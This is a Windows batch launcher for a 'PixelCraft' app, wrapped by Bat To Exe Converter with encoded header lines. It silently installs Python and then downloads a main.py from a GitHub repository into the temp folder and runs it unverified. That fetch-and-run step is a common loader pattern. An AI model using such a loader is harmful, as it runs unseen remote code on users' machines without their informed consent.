::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFB9BTgqNAE+1EbsQ5+n//NakqkwJc9ILNabW27OLbcEG7QiyStt/higPp4ZcXSQNKi35PkIVhC4K5y3LPsST0w==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFB9BTgqNAE+1EbsQ5+n//Namt1kScPA+b8HewrHu
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title PixelCraft Launcher
color 0A

echo.
echo ========================================
echo PixelCraft Launcher
echo ========================================
echo.

REM Check if Python is installed and working
echo [*] Checking Python installation...

python --version >nul 2>&1
if %errorlevel% == 0 (
echo [+] Python command available
set PYTHON_CMD=python
goto :check_requests
)

py --version >nul 2>&1
if %errorlevel% == 0 (
echo [+] Python launcher available
set PYTHON_CMD=py
goto :check_requests
)

py -3.11 --version >nul 2>&1
if %errorlevel% == 0 (
echo [+] Python 3.11 launcher available
set PYTHON_CMD=py -3.11
goto :check_requests
)

echo [-] Python not found. Installing Python 3.11...
echo.

REM Create temp directory for download
if not exist "%TEMP%\python_installer" mkdir "%TEMP%\python_installer"
cd /d "%TEMP%\python_installer"

echo [*] Downloading Python 3.11 installer...
powershell -Command "& {Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile 'python_installer.exe'}"

if not exist "python_installer.exe" (
echo [!] Failed to download Python installer
echo [!] Please install Python 3.11 manually from python.org
pause
exit /b 1
)

echo [*] Installing Python 3.11 silently...
echo [*] This may take a few minutes...
python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_launcher=1 Include_pip=1

if %errorlevel% neq 0 (
echo [!] Python installation failed
echo [!] Please try installing manually from python.org
pause
exit /b 1
)

echo [+] Python 3.11 installed successfully!
echo [*] Refreshing environment variables...

REM Refresh PATH
call refreshenv >nul 2>&1

REM Add common Python paths to current session
set PATH=%PATH%;C:\Program Files\Python311;C:\Program Files\Python311\Scripts
set PATH=%PATH%;C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311;C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts

REM Clean up installer
del /f /q "python_installer.exe" >nul 2>&1
cd /d "%~dp0"
rmdir /s /q "%TEMP%\python_installer" >nul 2>&1

echo [+] Installation complete!
echo.

:check_requests
echo [*] Checking if requests module is available...

REM Test if requests is available
%PYTHON_CMD% -c "import requests" >nul 2>&1
if %errorlevel% neq 0 (
echo [-] requests module not found, installing...
%PYTHON_CMD% -m pip install requests
if %errorlevel% neq 0 (
echo [!] Failed to install requests
echo [!] Trying to upgrade pip first...
%PYTHON_CMD% -m pip install --upgrade pip
%PYTHON_CMD% -m pip install requests
if %errorlevel% neq 0 (
echo [!] Still failed. Please install manually: pip install requests
pause
exit /b 1
)
)
echo [+] requests installed successfully
) else (
echo [+] requests module is available
)

echo [*] Downloading PixelCraft application...
REM Create temp directory for PixelCraft
if not exist "%TEMP%\pixelcrafter" mkdir "%TEMP%\pixelcrafter"
cd /d "%TEMP%\pixelcrafter"

REM Remove old main.py to ensure fresh download
del /f /q "main.py" >nul 2>&1

powershell -Command "& {Invoke-WebRequest -Uri 'https://github.com/DarkmoonOnDiscord/AutoDraw/raw/refs/heads/main/main.py' -OutFile 'main.py'}" >nul 2>&1

if not exist "main.py" (
echo [!] Failed to download main.py
echo [!] Please check your internet connection
pause
exit /b 1
)

echo [+] PixelCraft downloaded successfully!
echo.

echo [*] Starting PixelCraft...
echo.

REM Use the working Python command
%PYTHON_CMD% main.py
if %errorlevel% == 0 goto :success

echo [!] Could not run main.py with any Python command
echo [!] Please check your Python installation
pause
exit /b 1

:success
echo.
echo [+] Script completed!
pause